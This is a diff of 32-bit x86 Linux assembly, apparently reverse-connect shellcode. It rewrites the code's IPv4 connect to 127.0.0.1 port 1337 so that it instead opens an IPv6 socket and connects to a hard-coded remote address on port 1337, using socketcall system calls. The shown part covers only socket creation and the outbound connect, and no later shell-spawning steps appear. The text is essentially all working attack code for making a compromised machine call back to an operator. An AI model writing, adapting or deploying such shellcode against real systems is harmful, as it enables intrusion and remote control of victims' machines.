@@ -8,32 +8,40 @@ _start:
   xor ebx, ebx
   ;; arguments
   push ebx          ; #define IP_PROTO 0
-  push 0x1          ; #define SOCK_STREAM 1
-  push 0x2          ; #define PF_INET 2
+  inc ebx
+  push ebx          ; #define SOCK_STREAM 1
+  push 0xa          ; #define PF_INET6 10
   ;; function
   mov ecx, esp      ; pointer to args on the stack into ecx
   push 0x66
   pop eax           ; socketcall 0x66 == 102
-  inc ebx           ; #define SYS_SOCKET 1
   ;; call
   int 0x80
   ;; returned data
   xchg esi, eax     ; sockfd eax -> esi
 
-  ; connect ipv4
-  ;; v4rhost struct
-  inc ebx           ; 0x1 becomes 0x2 (PF_INET_
-  push 0x0101017F   ; v4rhost.sin_addr.s_addr = 127.0.0.1
-  push word 0x3905  ; v4rhost.sin_port = htons(1337)
-  push bx           ; v4rhost.sin_family = 0x2 (AF_INET)
+  ; connect ipv6
+  ;; cleanup
+  cdq
+  ;; v6rhost struct
+  push dword edx    ; v6rhost.sin6_scope_id
+  ;; the address fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509
+  push dword 0x09553dad
+  push dword 0xa923b761
+  push dword 0x02102b5a
+  push dword 0xa54b15fd
+  push edx          ; v6rhost.sin6_flowinfo
+  push word 0x3905  ; v6rhost.sin6_port = htons(1337)
+  push word 0xa     ; v6rhost.sin6_family = 0xa (AF6_INET)
   ;; arguments
-  inc ebx           ; 0x2 becomes 0x3 (SYS_CONNECT)
   mov ecx, esp      ; move our struct pointer into ECX
-  push 0x10         ; sizeof v4rhost
-  push ecx          ; pointer v4rhost
+  push 0x1c         ; sizeof v6rhost
+  push ecx          ; pointer v6rhost
   push esi          ; push sockfd onto the stack
   ;; function
   mov ecx, esp      ; pointer to args on the stack into ecx
+  inc ebx
+  inc ebx           ; #define SYS_CONNECT 3
   push 0x66         ; socketcall()
   pop eax
   ;; call
